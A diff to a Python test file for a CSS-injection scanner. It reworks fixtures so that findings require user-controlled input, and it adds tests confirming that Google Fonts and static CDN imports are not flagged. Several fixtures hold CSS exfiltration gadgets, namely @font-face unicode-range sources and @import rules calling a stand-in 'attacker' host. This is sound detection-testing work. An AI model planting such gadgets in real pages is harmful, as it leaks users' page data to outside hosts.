@@ -22,9 +22,14 @@ from xssentinel.core import css_injection as cssi
 # ---------------------------------------------------------------------------
 # Fixture HTML samples
 # ---------------------------------------------------------------------------
+# Phase 140: gadget fixtures must show the CSS is USER-CONTROLLED, otherwise
+# they are indistinguishable from a page shipping its own stylesheet (and
+# the rule must not fire -- see GOOGLE_FONTS_HTML below).  The placeholder
+# is written as <%= %> rather than {{ }} because _FONT_FACE_BLOCK_RE matches
+# with [^}]* and a literal "}" would truncate the @font-face body.
 FONT_FACE_HTML = (
     '<html><head><style>'
-    '@font-face { font-family: exfil; src: url(https://attacker/?l=1); '
+    '@font-face { font-family: exfil; src: url(<%= user_font %>); '
     'unicode-range: U+0041; }'
     'body { font-family: exfil; }'
     '</style></head><body>hi</body></html>'
@@ -39,7 +44,29 @@ KEYLOGGER_HTML = (
 
 IMPORT_HTML = (
     '<html><head><style>'
-    '@import url(https://attacker/evil.css);'
+    '@import url(https://attacker/evil.css?theme=<%= user_theme %>);'
+    'body { color: red; }'
+    '</style></head><body>x</body></html>'
+)
+
+# Phase 140 -- SAFE pages that used to be reported as high.  A page that
+# ships its own stylesheet matches the gadget patterns exactly: Google
+# Fonts emits @font-face + unicode-range + an external src:url(), and a
+# plain @import of a CDN is equally ordinary.  Neither is attacker-
+# controlled, so neither may produce a finding.  Confirmed on OWASP Juice
+# Shop, whose ONLY finding was a false css_font_face_exfil.
+GOOGLE_FONTS_HTML = (
+    '<html><head><style>'
+    "@font-face{font-family:'VT323';font-style:normal;font-weight:400;"
+    'font-display:swap;src:url(https://fonts.gstatic.com/s/vt323/v18/'
+    "pxiKyp0ihIEF2isfFJU.woff2) format('woff2');"
+    'unicode-range:U+0102-0103,U+0110-0111;}'
+    'body{font-family:VT323}</style></head><body>shop</body></html>'
+)
+
+STATIC_IMPORT_HTML = (
+    '<html><head><style>'
+    '@import url(https://cdn.example/theme.css);'
     'body { color: red; }'
     '</style></head><body>x</body></html>'
 )
@@ -109,6 +136,54 @@ class TestAnalyzePage:
         result = cssi.analyze_page(IMPORT_HTML)
         types = [v["type"] for v in result["violations"]]
         assert "css_import_injection" in types
+
+    def test_google_fonts_page_is_not_a_finding(self):
+        """Phase 140: a page shipping its own webfont is not CSSI.
+
+        Google Fonts emits exactly the gadget shape -- @font-face +
+        unicode-range + an external src:url().  Reporting that as *high*
+        made the scanner cry wolf on a large share of the real web; on
+        OWASP Juice Shop it was the only finding, and it was false.
+        """
+        result = cssi.analyze_page(GOOGLE_FONTS_HTML)
+        types = [v["type"] for v in result["violations"]]
+        assert types == [], f"expected no violations, got {types}"
+
+    def test_static_import_is_not_a_finding(self):
+        """Phase 140: a page-authored @import of a CDN is not CSSI."""
+        result = cssi.analyze_page(STATIC_IMPORT_HTML)
+        types = [v["type"] for v in result["violations"]]
+        assert types == [], f"expected no violations, got {types}"
+
+    def test_gadget_requires_user_control_not_pretty_url(self):
+        """The trigger must be user control, not an attacker-looking host.
+
+        Same URL as IMPORT_HTML minus the template placeholder -- the only
+        difference is that nothing here is attacker-controlled.
+        """
+        html = ('<html><head><style>'
+                '@import url(https://attacker/evil.css);'
+                '</style></head><body>x</body></html>')
+        assert cssi.analyze_page(html)["violations"] == []
+
+        with_marker = ('<html><head><style>'
+                       '@import url(https://attacker/evil.css?u=XSSMARKER7);'
+                       '</style></head><body>x</body></html>')
+        types = [v["type"] for v in cssi.analyze_page(
+            with_marker, extra_markers=["XSSMARKER7"])["violations"]]
+        assert "css_import_injection" in types
+
+    def test_short_marker_ignored(self):
+        """A 1-2 char param name must not count as user-control evidence.
+
+        ``q`` matches inside plenty of unrelated CSS identifiers, so short
+        markers are skipped rather than trusted.
+        """
+        html = ('<html><head><style>'
+                '@import url(https://attacker/evil.css?q=1);'
+                '</style></head><body>x</body></html>')
+        assert cssi.analyze_page(html,
+                                 extra_markers=["q"])["violations"] == []
 
     def test_cssom_cssText_sink(self):
         result = cssi.analyze_page(CSSOM_HTML)
@@ -210,8 +285,8 @@ class TestViolationStructure:
         """Repeated identical violations should be deduplicated."""
         html = (
             '<html><head><style>'
-            '@import url(https://attacker/a.css);'
-            '@import url(https://attacker/b.css);'
+            '@import url(https://attacker/a.css?u=<%= theme %>);'
+            '@import url(https://attacker/b.css?u=<%= theme %>);'
             '</style></head><body>x</body></html>'
         )
         result = cssi.analyze_page(html)
